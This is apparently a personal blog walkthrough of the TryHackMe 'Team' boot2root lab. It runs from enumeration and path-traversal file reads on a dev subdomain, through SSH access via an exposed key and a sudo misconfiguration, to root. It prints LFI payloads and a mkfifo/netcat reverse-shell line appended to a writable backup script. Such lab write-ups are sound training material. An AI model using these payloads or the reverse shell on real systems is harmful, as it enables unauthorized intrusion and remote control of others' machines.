---
title: Walkthrough - Team
published: true
---

Security, Boot2Root, Enumeration, Misconfiguration. boot2root machine

[https://tryhackme.com/room/teamcw](https://tryhackme.com/room/teamcw)

* * *

## Notes

- ``sudo nmap -Pn -sS -p- -T4 10.10.193.39 -vvv``

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

- ``sudo nmap -sV -sT -sC -p21,22,80 10.10.193.39``

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the port 80 apache httpd and viewing the source code we find ``Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!`` add to ``/etc/hosts`` and view.

- ``gobuster dir -u http://team.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error -t 100 -x txt,php``

- ``robots.txt`` gives us dale.
- we also find scripts.txt in /scripts/ we find in our goboster scan
- which leads us to ``http://team.thm/scripts/script.old``

```
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```
 
- inside the ftp

```
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```


- there is a hint that is telling us to look for a "dev" site that is under construction. 
- I had to use wfuzz for this as gobuster dns scans never returned any results. ``wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt``

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload            
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"              
000000019:   200        9 L      20 W       187 Ch      "dev"              
000000085:   200        9 L      20 W       187 Ch      "www.dev"          
000000689:   400        12 L     53 W       422 Ch      "gc._msdcs"    
```

- add ``dev.team.thm`` to the ``/etc/hosts`` file in order to view the dev site that is being refrenced.
-  we can access files here with ../ checking ``curl -s http://dev.team.thm/script.php?page=../../../etc/passwd``
- so we have 2 users dale and gyles. lets see if we can get rsa keys

- ``curl -s http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=script.php``
- ``curl -s http://dev.team.thm/script.php?page=../../../etc/group``

and finally we find the ssh key after trying literally everywhere

- ``curl -s http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config``
- this ssh key has no password so ``chmod 400 dale.rsa`` and ssh in

* * * 

## What is the user flag?

- ``cat user.txt``

* * * 

## What is the root flag?

- ``sudo -l``

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

- we can ``sudo -u gyles /home/gyles/admin_checks``
- and move to gyles by using ``/bin/sh`` 
- upgrade the terminal with ``python3 -c 'import pty;pty.spawn("/bin/bash")'``
- ``for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done``

```
You can write script: /usr/local/bin/main_backup.sh
```

- ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6666 >/tmp/f" >> /usr/local/bin/main_backup.sh``

![0xskar](/assets/team01.png)

* * * 

